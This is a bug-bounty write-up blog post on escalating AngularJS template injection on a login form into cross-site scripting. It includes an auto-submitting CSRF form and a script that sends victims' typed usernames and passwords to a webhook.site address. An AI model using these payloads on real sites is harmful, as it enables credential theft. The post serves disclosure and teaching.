---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-03_from-angularjs-csti-to-credentials-theft.md
original_filename: 2024-07-03_from-angularjs-csti-to-credentials-theft.md
title: From AngularJS CSTI to credentials theft
category: documents
detected_topics:
- xss
- command-injection
- csrf
- webhooks
tags:
- imported
- documents
- xss
- command-injection
- csrf
- webhooks
language: en
raw_sha256: b2cfec79fe647c5d97719e41ed29a19724ae5810b2c651e33b0e9c57b4738758
text_sha256: e74798903e2e6410dba38bdd899e84dba19ad4a13f4a6fb89bfdf6db1641b8f5
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: true
---

# From AngularJS CSTI to credentials theft

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-03_from-angularjs-csti-to-credentials-theft.md
- Source Type: markdown
- Detected Topics: xss, command-injection, csrf, webhooks
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: True
- Raw SHA256: `b2cfec79fe647c5d97719e41ed29a19724ae5810b2c651e33b0e9c57b4738758`
- Text SHA256: `e74798903e2e6410dba38bdd899e84dba19ad4a13f4a6fb89bfdf6db1641b8f5`


## Content

---
title: "From AngularJS CSTI to credentials theft"
page_title: "From AngularJS CSTI to credentials theft - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/from-angularjs-csti-to-credentials-stealing/"
final_url: "https://bergee.it/blog/from-angularjs-csti-to-credentials-stealing/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
bugs: ["CSTI"]
publication_date: "2024-07-03"
added_date: "2024-07-08"
source: "pentester.land/writeups.json"
original_index: 196
---

# From AngularJS CSTI to credentials theft

Posted on [2024-07-032026-04-27](https://bergee.it/blog/from-angularjs-csti-to-credentials-stealing/) by [bergee](https://bergee.it/blog/author/bergee/)

Hello again

This time I will tell you about the easy way of credentials theft.

I was doing some recon on some sites. I stumbled upon a site with the login form. I checked Wappalyzer and saw the site is using Angular 1.1.3.

![](https://bergee.it/blog/wp-content/uploads/2024/02/angular_csti.png)

I immediately put {{7*7}} payload in the login form and pressed the “Sign in” button. The value of the login form field changed from {{7*7}} to 49. This is a sign that the site was vulnerable to CSTI (Client Site Template Injection). I could easily turn it to XSS. So I looked for the proper XSS payload here:

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md>

I found the one that matches this version of angular js:
  
  
  {{constructor.constructor('alert(1)')()}}
  
  ![](https://bergee.it/blog/wp-content/uploads/2024/01/csti_angular_xss_form_black_redacted.jpg)
  

I put this payload into the login form, pressed “Sign in” and saw the alert box with value 1. Ok, I had post-based XSS. I looked at the form and there was no CSRF protection. I created the html file like this:
  
  
  <form method="post" action="https://www.redacted.com" id="frm">
  <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
  <input type="hidden" name="txtUserId" id="txtUserId" value="{{{{constructor.constructor('alert(document.domain)')()}}" />
  <input type="hidden" name="txtpassword" id="txtpassword" value="" />
  <input type="submit" value="Login">
  <script>
  document.forms['frm'].submit();
  </script>

I opened the file, the form was posted, and the domain name popup appeared on the screen. What can I do with XSS on the site with the login form? The victim can’t be logged in as the payload executes inside the login form. Maybe I can steal the credentials while the victim is logging in. All I need to do is read the login and password from the form and send these values to the external (the attacker’s) website. For this task I used [https://webhook.site.](https://webhook.site) The js payload looks like this:  

  
  
  document.addEventListener("change",(function(e){
  lg=document.forms["frm"].txtUserId.value,
  pwd=***REDACTED***frm"].txtpassword.value,
  fetch("https://webhook.site/56a3452e-f912-4e31-81d2-a683d1c2d8d9/?creds="+lg+"/"+pwd)
  }));

This code adds the event listener for the onChange event. So every time the user types the login or password and presses the tab key or “Sign in” button, the form values will be sent to the attacker’s address as the creds parameter. Putting all the pieces together the final payload for the login input value was:
  
  
  {{constructor.constructor('document.addEventListener(&quot;change&quot;,(function(e){lg=document.forms[&quot;frm&quot;].txtUserId.value,pwd=***REDACTED***)()}}

This way I could easily steal the victim’s credentials while he/she was logging in.

![](https://bergee.it/blog/wp-content/uploads/2024/01/webhooksite_reacted.jpg)

See you next bug

Reward: some swag
